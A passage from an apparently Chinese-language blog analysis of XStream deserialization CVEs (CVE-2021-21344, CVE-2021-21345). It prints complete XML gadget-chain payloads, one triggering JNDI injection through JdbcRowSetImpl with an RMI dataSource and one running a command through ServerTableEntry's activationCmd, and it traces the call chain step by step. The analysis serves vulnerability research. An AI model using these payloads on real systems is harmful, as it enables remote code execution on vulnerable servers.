class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>getDatabaseMetaData<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>官方POC比较长，去除一些没必要的属性后如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;&gt;</span><br><span class="line">        &lt;indexMap class=&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;&gt;</span><br><span class="line">          &lt;packet&gt;</span><br><span class="line">            &lt;message class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;&gt;</span><br><span class="line">              &lt;dataSource class=&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;&gt;</span><br><span class="line">                &lt;bridge class=&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;&gt;</span><br><span class="line">                  &lt;bridge class=&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;&gt;</span><br><span class="line">                    &lt;bi class=&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;&gt;</span><br><span class="line">                      &lt;jaxbType&gt;com.sun.rowset.JdbcRowSetImpl&lt;/jaxbType&gt;</span><br><span class="line">                      &lt;uriProperties/&gt;</span><br><span class="line">                      &lt;inheritedAttWildcard class=&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;&gt;</span><br><span class="line">                        &lt;getter&gt;</span><br><span class="line">                          &lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt;</span><br><span class="line">                          &lt;name&gt;getDatabaseMetaData&lt;/name&gt;</span><br><span class="line">                          &lt;parameter-types/&gt;</span><br><span class="line">                        &lt;/getter&gt;</span><br><span class="line">                      &lt;/inheritedAttWildcard&gt;</span><br><span class="line">                    &lt;/bi&gt;</span><br><span class="line">                    &lt;context&gt;</span><br><span class="line">                      &lt;marshallerPool class=&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;&gt;</span><br><span class="line">                        &lt;outer-class reference=&#x27;../..&#x27;/&gt;</span><br><span class="line">                      &lt;/marshallerPool&gt;</span><br><span class="line">                      &lt;nameList&gt;</span><br><span class="line">                        &lt;nsUriCannotBeDefaulted&gt;</span><br><span class="line">                          &lt;boolean&gt;true&lt;/boolean&gt;</span><br><span class="line">                        &lt;/nsUriCannotBeDefaulted&gt;</span><br><span class="line">                        &lt;namespaceURIs&gt;</span><br><span class="line">                          &lt;string&gt;1&lt;/string&gt;</span><br><span class="line">                        &lt;/namespaceURIs&gt;</span><br><span class="line">                        &lt;localNames&gt;</span><br><span class="line">                          &lt;string&gt;UTF-8&lt;/string&gt;</span><br><span class="line">                        &lt;/localNames&gt;</span><br><span class="line">                      &lt;/nameList&gt;</span><br><span class="line">                    &lt;/context&gt;</span><br><span class="line">                  &lt;/bridge&gt;</span><br><span class="line">                &lt;/bridge&gt;</span><br><span class="line">                &lt;jaxbObject class=&#x27;com.sun.rowset.JdbcRowSetImpl&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                  &lt;javax.sql.rowset.BaseRowSet&gt;</span><br><span class="line">                    &lt;default&gt;</span><br><span class="line">                      &lt;dataSource&gt;rmi://localhost:1097/Object&lt;/dataSource&gt;</span><br><span class="line">                    &lt;/default&gt;</span><br><span class="line">                  &lt;/javax.sql.rowset.BaseRowSet&gt;</span><br><span class="line">                &lt;/jaxbObject&gt;</span><br><span class="line">              &lt;/dataSource&gt;</span><br><span class="line">            &lt;/message&gt;</span><br><span class="line">            &lt;satellites/&gt;</span><br><span class="line">            &lt;invocationProperties/&gt;</span><br><span class="line">          &lt;/packet&gt;</span><br><span class="line">        &lt;/indexMap&gt;</span><br><span class="line">      &lt;/comparator&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>其中为一些属性赋值只是为了在到达sink方法前不会发生空指针引用异常打断执行，比如：</p>
<p>nsUriCannotBeDefaulted属性在XMLSerializer#startElement()</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092116649.png" alt="image-20230409211645371"></p>
<p>localNames属性在JAXBContextImpl#getUTF8NameTable()</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092118181.png" alt="image-20230409211822115"></p>
<p>类似的还有satellites、invocationProperties、marshallerPool、namespaceURIs、uriProperties。</p>
<p>调用链和CVE-2021-21343的前半部分相同，区别在于后半部分，dataSource属性由StreamingDataSource类实例变成JAXBAttachment类实例。</p>
<p>从不同点来看，XMLMultiPart#getMessage()如下，这里从getInputStream方法进去：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092235375.png" alt="image-20230409223553299"></p>
<p>调用了asInputStream方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092239965.png" alt="image-20230409223905899"></p>
<p>在asInputStream方法中，创建bab（ByteArrayBuffer），然后传入writeTo方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092240944.png" alt="image-20230409224015890"></p>
<p>调用BridgeWrapper的marshal方法，导入创建好的JdbcRowSetImpl对象（对应jaxbObject属性）</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092244169.png" alt="image-20230409224411090"></p>
<p>BridgeWrapper的bridge属性为BridgeImpl类实例，调用marshal方法，由于该类实例（BridgeImpl）并没有对应的方法，但是父类Bridge有，所以由父类执行marshal方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092246018.png" alt="image-20230409224646953"></p>
<p>调用marshal方法，父类没有又回到子类（BridgeImpl）了：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092250470.png" alt="image-20230409225009411"></p>
<p>接着调用write方法，将bi（ClassBeanInfoImpl）和t（JdbcRowSetImpl）传入：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092301893.png" alt="image-20230409230115823"></p>
<p>在write方法中，serializer无需赋值，会自动创建，由于jaxbType为JdbcRowSetImpl，所以进入第一层if，在第二层if中，由于obj为JdbcRowSetImpl对象，进入else分支，调用childAsXsiType方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092342461.png" alt="image-20230409234212390"></p>
<p>在childAsXsiType方法中，child为该方法的第一个参数，也就是JdbcRowSetImpl对象，不等于null，进入else分支，将方法的第三个参数expected（ClassBeanInfoImpl）赋值给临时变量actual：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092347295.png" alt="image-20230409234724180"></p>
<p>在else分支的后面，调用ClassBeanInfoImpl的serializeURIs方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092345643.png" alt="image-20230409234545562"></p>
<p>在serializeURIs方法中，inheritedAttWildcard为GetterSetterReflection类实例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;inheritedAttWildcard class=&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;&gt;</span><br><span class="line">	&lt;getter&gt;</span><br><span class="line">		&lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt;</span><br><span class="line">		&lt;name&gt;getDatabaseMetaData&lt;/name&gt;</span><br><span class="line">		&lt;parameter-types/&gt;</span><br><span class="line">	&lt;/getter&gt;</span><br><span class="line">&lt;/inheritedAttWildcard&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092352118.png" alt="image-20230409235259016"></p>
<p>反射执行getDatabaseMetaData方法，传入构造好的JdbcRowSetImpl对象：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092354086.png" alt="image-20230409235449999"></p>
<p>后面就是熟悉的JdbcRowSetImpl对象的利用链了，在getDatabaseMetaData方法中，调用connect方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092357646.png" alt="image-20230409235727567"></p>
<p>将可控dataSource传入lookup，造成JNDI注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;default&gt;</span><br><span class="line">	&lt;dataSource&gt;rmi://localhost:1097/Object&lt;/dataSource&gt;</span><br><span class="line">&lt;/default&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092358094.png" alt="image-20230409235802019"></p>
<p>JNDI注入可以直接命令执行，原理是利用ResourceRef配合BeanFactory，使用ELProcessor执行EL表达式。</p>
<h2 id="CVE-2021-21345"><a href="#CVE-2021-21345" class="headerlink" title="CVE-2021-21345"></a>CVE-2021-21345</h2><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><p>直接造成RCE，官方给的POC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;&gt;</span><br><span class="line">        &lt;indexMap class=&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;&gt;</span><br><span class="line">          &lt;packet&gt;</span><br><span class="line">            &lt;message class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;&gt;</span><br><span class="line">              &lt;dataSource class=&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;&gt;</span><br><span class="line">                &lt;bridge class=&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;&gt;</span><br><span class="line">                  &lt;bridge class=&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;&gt;</span><br><span class="line">                    &lt;bi class=&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;&gt;</span><br><span class="line">                      &lt;jaxbType&gt;com.sun.corba.se.impl.activation.ServerTableEntry&lt;/jaxbType&gt;</span><br><span class="line">                      &lt;uriProperties/&gt;</span><br><span class="line">                      &lt;attributeProperties/&gt;</span><br><span class="line">                      &lt;inheritedAttWildcard class=&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;&gt;</span><br><span class="line">                        &lt;getter&gt;</span><br><span class="line">                          &lt;class&gt;com.sun.corba.se.impl.activation.ServerTableEntry&lt;/class&gt;</span><br><span class="line">                          &lt;name&gt;verify&lt;/name&gt;</span><br><span class="line">                          &lt;parameter-types/&gt;</span><br><span class="line">                        &lt;/getter&gt;</span><br><span class="line">                      &lt;/inheritedAttWildcard&gt;</span><br><span class="line">                    &lt;/bi&gt;</span><br><span class="line">                    &lt;tagName/&gt;</span><br><span class="line">                    &lt;context&gt;</span><br><span class="line">                      &lt;marshallerPool class=&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;&gt;</span><br><span class="line">                        &lt;outer-class reference=&#x27;../..&#x27;/&gt;</span><br><span class="line">                      &lt;/marshallerPool&gt;</span><br><span class="line">                      &lt;nameList&gt;</span><br><span class="line">                        &lt;nsUriCannotBeDefaulted&gt;</span><br><span class="line">                          &lt;boolean&gt;true&lt;/boolean&gt;</span><br><span class="line">                        &lt;/nsUriCannotBeDefaulted&gt;</span><br><span class="line">                        &lt;namespaceURIs&gt;</span><br><span class="line">                          &lt;string&gt;1&lt;/string&gt;</span><br><span class="line">                        &lt;/namespaceURIs&gt;</span><br><span class="line">                        &lt;localNames&gt;</span><br><span class="line">                          &lt;string&gt;UTF-8&lt;/string&gt;</span><br><span class="line">                        &lt;/localNames&gt;</span><br><span class="line">                      &lt;/nameList&gt;</span><br><span class="line">                    &lt;/context&gt;</span><br><span class="line">                  &lt;/bridge&gt;</span><br><span class="line">                &lt;/bridge&gt;</span><br><span class="line">                &lt;jaxbObject class=&#x27;com.sun.corba.se.impl.activation.ServerTableEntry&#x27;&gt;</span><br><span class="line">                  &lt;activationCmd&gt;calc&lt;/activationCmd&gt;</span><br><span class="line">                &lt;/jaxbObject&gt;</span><br><span class="line">              &lt;/dataSource&gt;</span><br><span class="line">            &lt;/message&gt;</span><br><span class="line">            &lt;satellites/&gt;</span><br><span class="line">            &lt;invocationProperties/&gt;</span><br><span class="line">          &lt;/packet&gt;</span><br><span class="line">        &lt;/indexMap&gt;</span><br><span class="line">      &lt;/comparator&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    